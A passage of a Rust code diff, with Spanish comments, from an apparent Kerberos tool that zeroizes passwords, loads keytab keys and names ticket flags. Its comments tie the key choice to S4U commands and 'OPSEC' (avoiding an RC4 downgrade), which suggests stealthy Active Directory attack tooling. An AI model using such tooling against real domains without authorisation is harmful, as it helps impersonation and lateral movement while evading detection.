             .map_err(|e| format!("no pude leer la contraseña de stdin: {e}"))?;
         let pw = buf.trim_end_matches(['\r', '\n']).to_string();
+        buf.zeroize();
         if pw.is_empty() {
             return Err("stdin cerrado o contraseña vacía".into());
         }
-        return Ok(pw);
+        return Ok(Zeroizing::new(pw));
     }
     password.ok_or_else(|| {
         "falta la contraseña: usa -p/--password, la env CHARON_PASSWORD o --password-stdin".into()
@@ -1333,6 +1685,65 @@ fn key_from_keytab(path: &str, user: &str, realm: &str) -> Result<(KerberosKey, 
         })?;
     let key = KerberosKey::from_raw(entry.enctype, &entry.key).map_err(|e| e.to_string())?;
     Ok((key, entry.kvno, entry.enctype))
+}
+
+/// TODAS las entradas de un keytab para `user@realm` (una cuenta puede
+/// llevar varias enctypes: AES256/AES128/RC4 — ktadd las exporta todas).
+/// Los comandos S4U lo necesitan para elegir la clave de descifrado del
+/// ticket según el etype REAL que el KDC eligió (ver s4u2self).
+fn keys_from_keytab(path: &str, user: &str, realm: &str) -> Result<Vec<(KerberosKey, u32, i32)>, String> {
+    warn_lax_keytab_perms(path);
+    let bytes = std::fs::read(path).map_err(|e| format!("no pude leer {path}: {e}"))?;
+    let entries =
+        charon_krb5::keytab::parse(&bytes).map_err(|e| format!("keytab {path}: {e}"))?;
+    let wanted = format!("{user}@{realm}");
+    let mut out = Vec::new();
+    for e in &entries {
+        if e.qualified() == wanted {
+            let key = KerberosKey::from_raw(e.enctype, &e.key).map_err(|e| e.to_string())?;
+            out.push((key, e.kvno, e.enctype));
+        }
+    }
+    if out.is_empty() {
+        let list = entries.iter().map(|e| e.qualified()).collect::<Vec<_>>().join(", ");
+        return Err(if list.is_empty() {
+            format!("el keytab {path} no tiene entradas")
+        } else {
+            format!("el keytab {path} no trae clave para {wanted} (entradas: {list})")
+        });
+    }
+    Ok(out)
+}
+
+/// Elige la mejor entrada del keytab para PEDIR un TGT: AES256, luego
+/// AES128 y por último RC4 (OPSEC: sin downgrade si la cuenta trae AES;
+/// el resto de enctypes queda disponible para el descifrado del ticket
+/// S4U).
+fn pick_keytab_key(keys: &[(KerberosKey, u32, i32)], user: &str) -> Result<(KerberosKey, u32, i32), String> {
+    let pref = |want: i32| keys.iter().find(|k| k.2 == want).cloned();
+    pref(etype_mod::AES256_CTS_HMAC_SHA1_96)
+        .or_else(|| pref(etype_mod::AES128_CTS_HMAC_SHA1_96))
+        .or_else(|| pref(etype_mod::RC4_HMAC))
+        .ok_or_else(|| format!("el keytab no trae ninguna enctype soportada para {user}"))
+}
+
+/// Nombres legibles de los flags de ticket (para la salida JSON de `as`).
+fn ticket_flag_names(flags: u32) -> Vec<&'static str> {
+    use charon_krb5::ticket_flags as tf;
+    let mut out = Vec::new();
+    let mut push = |set: bool, name: &'static str| {
+        if set {
+            out.push(name);
+        }
+    };
+    push(flags & tf::FORWARDABLE != 0, "forwardable");
+    push(flags & tf::RENEWABLE != 0, "renewable");
+    push(flags & tf::INITIAL != 0, "initial");
+    push(flags & tf::PRE_AUTHENT != 0, "pre_authent");
+    push(flags & tf::HW_AUTHENT != 0, "hw_authent");
+    push(flags & tf::TRANSITED_POLICY_CHECKED != 0, "transited_policy_checked");
+    push(flags & tf::OK_AS_DELEGATE != 0, "ok_as_delegate");
+    out
 }
 
 fn decode_hex(s: &str) -> Result<Vec<u8>, String> {
